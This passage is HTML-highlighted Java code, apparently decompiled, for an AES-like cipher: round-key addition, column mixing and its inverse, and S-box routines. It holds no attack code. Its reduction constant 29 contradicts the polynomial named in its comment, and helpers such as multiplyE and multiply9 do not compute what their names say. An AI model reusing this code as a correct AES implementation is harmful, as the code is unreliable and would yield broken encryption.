<span class="keyword">this</span>._states[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">this</span>._states[i][j] = temp[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addRoundKey</span><span class="params">(<span class="keyword">byte</span>[] key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] bArr = <span class="keyword">this</span>._states[i];</span><br><span class="line">                bArr[j] = (<span class="keyword">byte</span>) (bArr[j] ^ key[(j * <span class="number">4</span>) + i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">add</span><span class="params">(<span class="keyword">byte</span> a, <span class="keyword">byte</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>) (a ^ b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">add</span><span class="params">(<span class="keyword">byte</span> a, <span class="keyword">byte</span> b, <span class="keyword">byte</span> c, <span class="keyword">byte</span> d)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>) (((a ^ b) ^ c) ^ d);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">multiply2</span><span class="params">(<span class="keyword">byte</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>) (a &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>) ((a &lt;&lt; <span class="number">1</span>) ^ <span class="number">29</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">multiply3</span><span class="params">(<span class="keyword">byte</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> add(a, multiply2(a));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mixCloumns</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                temp[j] = <span class="keyword">this</span>._states[j][i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>._states[<span class="number">0</span>][i] = add(multiply2(temp[<span class="number">0</span>]), multiply3(temp[<span class="number">1</span>]), temp[<span class="number">2</span>], temp[<span class="number">3</span>]);</span><br><span class="line">            <span class="keyword">this</span>._states[<span class="number">1</span>][i] = add(temp[<span class="number">0</span>], multiply2(temp[<span class="number">1</span>]), multiply3(temp[<span class="number">2</span>]), temp[<span class="number">3</span>]);</span><br><span class="line">            <span class="keyword">this</span>._states[<span class="number">2</span>][i] = add(temp[<span class="number">0</span>], temp[<span class="number">1</span>], multiply2(temp[<span class="number">2</span>]), multiply3(temp[<span class="number">3</span>]));</span><br><span class="line">            <span class="keyword">this</span>._states[<span class="number">3</span>][i] = add(multiply3(temp[<span class="number">0</span>]), temp[<span class="number">1</span>], temp[<span class="number">2</span>], multiply2(temp[<span class="number">3</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">multiplyE</span><span class="params">(<span class="keyword">byte</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>) (multiply2(a) ^ multiply2(a) ^ multiply2(a) ^ multiply2(a) ^ multiply2(a) ^ multiply2(a)</span><br><span class="line">                ^ multiply2(a));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">multiplyB</span><span class="params">(<span class="keyword">byte</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>) (multiply2(a) ^ multiply2(a) ^ multiply2(a) ^ multiply2(a) ^ multiply3(a));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">multiplyD</span><span class="params">(<span class="keyword">byte</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>) (multiply2(a) ^ multiply2(a) ^ multiply2(a) ^ multiply2(a) ^ multiply2(a) ^ multiply3(a));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">multiply9</span><span class="params">(<span class="keyword">byte</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>) (multiply2(a) ^ multiply2(a) ^ multiply2(a) ^ multiply3(a));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">byte</span> <span class="title">GFMul</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">byte</span> b)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">byte</span> p = <span class="number">0</span>; </span><br><span class="line">        <span class="keyword">byte</span> hi_bit_set; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> counter = <span class="number">0</span>; counter &lt; <span class="number">8</span>; counter++) &#123; </span><br><span class="line">          <span class="keyword">if</span> ((b &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123; </span><br><span class="line">            p ^= a; </span><br><span class="line">          &#125; </span><br><span class="line">          hi_bit_set = (<span class="keyword">byte</span>) (a &amp; <span class="number">0x80</span>); </span><br><span class="line">          a &lt;&lt;= <span class="number">1</span>; </span><br><span class="line">          <span class="keyword">if</span> (hi_bit_set != <span class="number">0</span>) &#123; </span><br><span class="line">            a ^= <span class="number">29</span>; <span class="comment">/* x^8 + x^4 + x^3 + x + 1 */</span></span><br><span class="line">          &#125; </span><br><span class="line">          b &gt;&gt;= <span class="number">1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> p; </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reMixCloumns</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> arr[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">                arr[j] = <span class="keyword">this</span>._states[j][i];</span><br><span class="line">            <span class="keyword">this</span>._states[<span class="number">0</span>][i] =(<span class="keyword">byte</span>) (GFMul(<span class="number">0x0e</span>, arr[<span class="number">0</span>]) ^ GFMul(<span class="number">0x0b</span>, arr[<span class="number">1</span>]) ^ GFMul(<span class="number">0x0d</span>, arr[<span class="number">2</span>]) ^ GFMul(<span class="number">0x09</span>, arr[<span class="number">3</span>]));</span><br><span class="line">            <span class="keyword">this</span>._states[<span class="number">1</span>][i] =(<span class="keyword">byte</span>) (GFMul(<span class="number">0x09</span>, arr[<span class="number">0</span>]) ^ GFMul(<span class="number">0x0e</span>, arr[<span class="number">1</span>]) ^ GFMul(<span class="number">0x0b</span>, arr[<span class="number">2</span>]) ^ GFMul(<span class="number">0x0d</span>, arr[<span class="number">3</span>]));</span><br><span class="line">            <span class="keyword">this</span>._states[<span class="number">2</span>][i] =(<span class="keyword">byte</span>) (GFMul(<span class="number">0x0d</span>, arr[<span class="number">0</span>]) ^ GFMul(<span class="number">0x09</span>, arr[<span class="number">1</span>]) ^ GFMul(<span class="number">0x0e</span>, arr[<span class="number">2</span>]) ^ GFMul(<span class="number">0x0b</span>, arr[<span class="number">3</span>]));</span><br><span class="line">            <span class="keyword">this</span>._states[<span class="number">3</span>][i] =(<span class="keyword">byte</span>) (GFMul(<span class="number">0x0b</span>, arr[<span class="number">0</span>]) ^ GFMul(<span class="number">0x0d</span>, arr[<span class="number">1</span>]) ^ GFMul(<span class="number">0x09</span>, arr[<span class="number">2</span>]) ^ GFMul(<span class="number">0x0e</span>, arr[<span class="number">3</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">inverseSbox</span><span class="params">(<span class="keyword">byte</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>) <span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">82</span>, <span class="number">9</span>, <span class="number">106</span>, <span class="number">213</span>, <span class="number">48</span>, <span class="number">54</span>, <span class="number">165</span>, <span class="number">56</span>, <span class="number">191</span>, <span class="number">64</span>, <span class="number">163</span>, <span class="number">158</span>, <span class="number">129</span>, <span class="number">243</span>, <span class="number">215</span>, <span class="number">251</span>, <span class="number">124</span>, <span class="number">227</span>, <span class="number">57</span>,</span><br><span class="line">                <span class="number">130</span>, <span class="number">155</span>, <span class="number">47</span>, <span class="number">255</span>, <span class="number">135</span>, <span class="number">52</span>, <span class="number">142</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">196</span>, <span class="number">222</span>, <span class="number">233</span>, <span class="number">203</span>, <span class="number">84</span>, <span class="number">123</span>, <span class="number">148</span>, <span class="number">50</span>, <span class="number">166</span>, <span class="number">194</span>, <span class="number">35</span>, <span class="number">61</span>, <span class="number">238</span>,</span><br><span class="line">                <span class="number">76</span>, <span class="number">149</span>, <span class="number">11</span>, <span class="number">66</span>, <span class="number">250</span>, <span class="number">195</span>, <span class="number">78</span>, <span class="number">8</span>, <span class="number">46</span>, <span class="number">161</span>, <span class="number">102</span>, <span class="number">40</span>, <span class="number">217</span>, <span class="number">36</span>, <span class="number">178</span>, <span class="number">118</span>, <span class="number">91</span>, <span class="number">162</span>, <span class="number">73</span>, <span class="number">109</span>, <span class="number">139</span>, <span class="number">209</span>, <span class="number">37</span>,</span><br><span class="line">                <span class="number">114</span>, <span class="number">248</span>, <span class="number">246</span>, <span class="number">100</span>, <span class="number">134</span>, <span class="number">104</span>, <span class="number">152</span>, <span class="number">22</span>, <span class="number">212</span>, <span class="number">164</span>, <span class="number">92</span>, <span class="number">204</span>, <span class="number">93</span>, <span class="number">101</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">253</span>, <span class="number">237</span>,</span><br><span class="line">                <span class="number">185</span>, <span class="number">218</span>, <span class="number">94</span>, <span class="number">21</span>, <span class="number">70</span>, <span class="number">87</span>, <span class="number">167</span>, <span class="number">141</span>, <span class="number">157</span>, <span class="number">132</span>, <span class="number">144</span>, <span class="number">216</span>, <span class="number">171</span>, <span class="number">0</span>, <span class="number">140</span>, <span class="number">188</span>, <span class="number">211</span>, <span class="number">10</span>, <span class="number">247</span>, <span class="number">228</span>, <span class="number">88</span>, <span class="number">5</span>, <span class="number">184</span>,</span><br><span class="line">                <span class="number">179</span>, <span class="number">69</span>, <span class="number">6</span>, <span class="number">208</span>, <span class="number">44</span>, <span class="number">30</span>, <span class="number">143</span>, <span class="number">202</span>, <span class="number">63</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">193</span>, <span class="number">175</span>, <span class="number">189</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">107</span>, <span class="number">58</span>, <span class="number">145</span>, <span class="number">17</span>, <span class="number">65</span>, <span class="number">79</span>,</span><br><span class="line">                <span class="number">103</span>, <span class="number">220</span>, <span class="number">234</span>, <span class="number">151</span>, <span class="number">242</span>, <span class="number">207</span>, <span class="number">206</span>, <span class="number">240</span>, <span class="number">180</span>, <span class="number">230</span>, <span class="number">115</span>, <span class="number">150</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">34</span>, <span class="number">231</span>, <span class="number">173</span>, <span class="number">53</span>, <span class="number">133</span>, <span class="number">226</span>, <span class="number">249</span>,</span><br><span class="line">                <span class="number">55</span>, <span class="number">232</span>, <span class="number">28</span>, <span class="number">117</span>, <span class="number">223</span>, <span class="number">110</span>, <span class="number">71</span>, <span class="number">241</span>, <span class="number">26</span>, <span class="number">113</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">197</span>, <span class="number">137</span>, <span class="number">111</span>, <span class="number">183</span>, <span class="number">98</span>, <span class="number">14</span>, <span class="number">170</span>, <span class="number">24</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">252</span>,</span><br><span class="line">                <span class="number">86</span>, <span class="number">62</span>, <span class="number">75</span>, <span class="number">198</span>, <span class="number">210</span>, <span class="number">121</span>, <span class="number">32</span>, <span class="number">154</span>, <span class="number">219</span>, <span class="number">192</span>, <span class="number">254</span>, <span class="number">120</span>, <span class="number">205</span>, <span class="number">90</span>, <span class="number">244</span>, <span class="number">31</span>, <span class="number">221</span>, <span class="number">168</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">7</span>, <span class="number">199</span>, <span class="number">49</span>,</span><br><span class="line">                <span class="number">177</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">128</span>, <span class="number">236</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">81</span>, <span class="number">127</span>, <span class="number">169</span>, <span class="number">25</span>, <span class="number">181</span>, <span class="number">74</span>, <span class="number">13</span>, <span class="number">45</span>, <span class="number">229</span>, <span class="number">122</span>, <span class="number">159</span>, <span class="number">147</span>, <span class="number">201</span>, <span class="number">156</span>,</span><br><span class="line">                <span class="number">239</span>, <span class="number">160</span>, <span class="number">224</span>, <span class="number">59</span>, <span class="number">77</span>, <span class="number">174</span>, <span class="number">42</span>, <span class="number">245</span>, <span class="number">176</span>, <span class="number">200</span>, <span class="number">235</span>, <span class="number">187</span>, <span class="number">60</span>, <span class="number">131</span>, <span class="number">83</span>, <span class="number">153</span>, <span class="number">97</span>, <span class="number">23</span>, <span class="number">43</span>, <span class="number">4</span>, <span class="number">126</span>, <span class="number">186</span>, <span class="number">119</span>,</span><br><span class="line">                <span class="number">214</span>, <span class="number">38</span>, <span class="number">225</span>, <span class="number">105</span>, <span class="number">20</span>, <span class="number">99</span>, <span class="number">85</span>, <span class="number">33</span>, <span class="number">12</span>, <span class="number">125</span> &#125;[(a + <span class="number">256</span>) % <span class="number">256</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">multiply</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            a += <span class="number">256</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            b += <span class="number">256</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] avalues = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">int</span>[] bvalues = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            avalues[i] = a % <span class="number">2</span>;</span><br><span class="line">            a /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">8</span>; i2++) &#123;</span><br><span class="line">            bvalues[i2] = b % <span class="number">2</span>;</span><br><span class="line">            b /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] results = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">7</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bvalues[j] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i3 = <span class="number">0</span>; i3 &lt; <span class="number">8</span>; i3++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (avalues[i3] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        results[i3 + j] = (results[i3 + j] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (results[<span class="number">15</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            results[<span class="number">5</span>] = (results[<span class="number">5</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">3</span>] = (results[<span class="number">3</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">2</span>] = (results[<span class="number">2</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">1</span>] = (results[<span class="number">1</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">0</span>] = (results[<span class="number">0</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (results[<span class="number">14</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            results[<span class="number">7</span>] = (results[<span class="number">7</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">4</span>] = (results[<span class="number">4</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">3</span>] = (results[<span class="number">3</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">1</span>] = (results[<span class="number">1</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (results[<span class="number">13</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            results[<span class="number">6</span>] = (results[<span class="number">6</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">3</span>] = (results[<span class="number">3</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">2</span>] = (results[<span class="number">2</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">0</span>] = (results[<span class="number">0</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (results[<span class="number">12</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            results[<span class="number">7</span>] = (results[<span class="number">7</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">5</span>] = (results[<span class="number">5</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">3</span>] = (results[<span class="number">3</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">1</span>] = (results[<span class="number">1</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">0</span>] = (results[<span class="number">0</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (results[<span class="number">11</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            results[<span class="number">7</span>] = (results[<span class="number">7</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">6</span>] = (results[<span class="number">6</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">4</span>] = (results[<span class="number">4</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">3</span>] = (results[<span class="number">3</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (results[<span class="number">10</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            results[<span class="number">6</span>] = (results[<span class="number">6</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">5</span>] = (results[<span class="number">5</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">3</span>] = (results[<span class="number">3</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">2</span>] = (results[<span class="number">2</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (results[<span class="number">9</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            results[<span class="number">5</span>] = (results[<span class="number">5</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">4</span>] = (results[<span class="number">4</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">2</span>] = (results[<span class="number">2</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">1</span>] = (results[<span class="number">1</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (results[<span class="number">8</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            results[<span class="number">4</span>] = (results[<span class="number">4</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">3</span>] = (results[<span class="number">3</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">1</span>] = (results[<span class="number">1</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">            results[<span class="number">0</span>] = (results[<span class="number">0</span>] + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>) ((results[<span class="number">7</span>] * <span class="number">128</span>) + (results[<span class="number">6</span>] * <span class="number">64</span>) + (results[<span class="number">5</span>] * <span class="number">32</span>) + (results[<span class="number">4</span>] * <span class="number">16</span>) + (results[<span class="number">3</span>] * <span class="number">8</span>)</span><br><span class="line">                + (results[<span class="number">2</span>] * <span class="number">4</span>) + (results[<span class="number">1</span>] * <span class="number">2</span>) + results[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">inverse</span><span class="params">(<span class="keyword">byte</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> result = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">254</span>; i++) &#123;</span><br><span class="line">            result = multiply(result, a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">sbox</span><span class="params">(<span class="keyword">byte</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> inverse = inverse(a);</span><br><span class="line">        <span class="keyword">if</span> (inverse &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            inverse += <span class="number">256</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] c = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            c[i] = inverse % <span class="number">2</span>;</span><br><span class="line">            inverse /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] s = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">8</span>];</span><br><span class="line">        s[<span class="number">7</span>] = ((((c[<span class="number">7</span>] + c[<span class="number">6</span>]) + c[<span class="number">5</span>]) + c[<span class="number">4</span>]) + c[<span class="number">3</span>]) % <span class="number">2</span>;</span><br><span class="line">        s[<span class="number">6</span>] = (((((c[<span class="number">6</span>] + c[<span class="number">5</span>]) + c[<span class="number">4</span>]) + c[<span class="number">3</span>]) + c[<span class="number">2</span>]) + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        s[<span class="number">5</span>] = (((((c[<span class="number">5</span>] + c[<span class="number">4</span>]) + c[<span class="number">3</span>]) + c[<span class="number">2</span>]) + c[<span class="number">1</span>]) + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        s[<span class="number">4</span>] = ((((c[<span class="number">4</span>] + c[<span class="number">3</span>]) + c[<span class="number">2</span>]) + c[<span class="number">1</span>]) + c[<span class="number">0</span>]) % <span class="number">2</span>;</span><br><span class="line">        s[<span class="number">3</span>] = ((((c[<span class="number">7</span>] + c[<span class="number">3</span>]) + c[<span class="number">2</span>]) + c[<span class="number">1</span>]) + c[<span class="number">0</span>]) % <span class="number">2</span>;</span><br><span class="line">        s[<span class="number">2</span>] = ((((c[<span class="number">7</span>] + c[<span class="number">6</span>]) + c[<span class="number">2</span>]) + c[<span class="number">1</span>]) + c[<span class="number">0</span>]) % <span class="number">2</span>;</span><br><span class="line">        s[<span class="number">1</span>] = (((((c[<span class="number">7</span>] + c[<span class="number">6</span>]) + c[<span class="number">5</span>]) + c[<span class="number">1</span>]) + c[<span class="number">0</span>]) + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        s[<span class="number">0</span>] = (((((c[<span class="number">7</span>] + c[<span class="number">6</span>]) + c[<span class="number">5</span>]) + c[<span class="number">4</span>]) + c[<span class="number">0</span>]) + <span class="number">1</span>) % <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>) ((s[<span class="number">7</span>] * <span class="number">128</span>) + (s[<span class="number">6</span>] * <span class="number">64</span>) + (s[<span class="number">5</span>] * <span class="number">32</span>) + (s[<span class="number">4</span>] * <span class="number">16</span>) + (s[<span class="number">3</span>] * <span class="number">8</span>) + (s[<span class="number">2</span>] * <span class="number">4</span>) + (s[<span class="number">1</span>] * <span class="number">2</span>)</span><br><span class="line">                + s[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">substitute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">this</span>._states[i][j] = sbox(<span class="keyword">this</span>._states[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reSubstitute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">this</span>._states[i][j] = inverseSbox(<span class="keyword">this</span>._states[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

